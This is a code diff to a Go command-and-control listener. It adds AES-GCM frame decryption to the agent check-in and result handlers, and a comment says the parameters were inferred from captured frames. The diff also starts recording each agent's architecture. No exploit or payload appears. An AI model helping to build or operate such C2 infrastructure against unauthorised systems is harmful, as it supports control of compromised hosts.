@@ -284,12 +284,14 @@ func (cl *C2Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
 
 	var req CheckinRequest
 	if err := json.Unmarshal(body, &req); err != nil {
-		// Try with AES decryption if configured
+		// Fall back to the agent transport frame (AES-256-GCM,
+		// <u32 LE len><[12B nonce][ct][16B tag]>) when the listener has a salt.
+		// 帧密钥 = FrameSaltKey(EncryptSalt)；AEAD 参数系由捕获帧推断（见 protocol.go）。
 		engine := GetEngine()
 		listener := engine.GetListener(cl.ID)
 		if listener != nil && listener.EncryptSalt != "" {
-			key := DeriveKey(listener.EncryptSalt, listener.VerifyKey)
-			if err := DecodeMessage(body, &req, key); err != nil {
+			pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
+			if ferr != nil || json.Unmarshal(pt, &req) != nil {
 				http.Error(w, "Bad request", http.StatusBadRequest)
 				return
 			}
@@ -323,6 +325,7 @@ func (cl *C2Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
 		req.HostName,
 		req.OsName,
 		req.ProcessName,
+		req.Arch,
 	)
 	if err != nil {
 		http.Error(w, "Internal error", http.StatusInternalServerError)
@@ -443,8 +446,20 @@ func (cl *C2Listener) handlePostResult(w http.ResponseWriter, r *http.Request) {
 
 	var req ResultRequest
 	if err := json.Unmarshal(body, &req); err != nil {
-		http.Error(w, "Bad request", http.StatusBadRequest)
-		return
+		// Agent transport frame fallback, same as check-in: the HTTP transport
+		// GCM-wraps the result body.
+		engine := GetEngine()
+		listener := engine.GetListener(cl.ID)
+		if listener != nil && listener.EncryptSalt != "" {
+			pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
+			if ferr != nil || json.Unmarshal(pt, &req) != nil {
+				http.Error(w, "Bad request", http.StatusBadRequest)
+				return
+			}
+		} else {
+			http.Error(w, "Bad request", http.StatusBadRequest)
+			return
+		}
 	}
 
 	engine := GetEngine()
@@ -883,6 +898,7 @@ func (cl *C2Listener) handleWSCheckin(msg *WSMessage, remoteAddr string) *WSMess
 		checkin.HostName,
 		checkin.OsName,
 		checkin.ProcessName,
+		checkin.Arch,
 	)
 	if err != nil {
 		log.Printf("[WS:%d] Failed to register client: %v", cl.ID, err)
